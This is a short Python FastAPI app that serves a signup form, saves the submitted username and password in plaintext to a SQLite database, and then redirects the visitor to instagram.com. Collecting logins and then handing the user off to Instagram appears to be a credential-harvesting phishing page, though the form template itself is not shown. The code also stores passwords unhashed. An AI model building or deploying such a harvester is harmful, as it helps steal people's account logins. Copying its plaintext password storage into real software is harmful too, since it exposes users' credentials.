from fastapi import FastAPI, Request, Form
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.responses import RedirectResponse
from fastapi.responses import HTMLResponse
import starlette.status as status
import sqlite3

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

@app.get("/", response_class=HTMLResponse)
async def signup_form(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/signup")
async def signup_submit(request: Request, username: str = Form(...), password: str = Form(...)):
    conn = sqlite3.connect('app.db')
    c = conn.cursor()
    c.execute("INSERT INTO users (username, password) VALUES (?, ?)", (username, password))
    conn.commit()
    conn.close()
    return RedirectResponse(url='https://instagram.com', status_code=status.HTTP_302_FOUND)
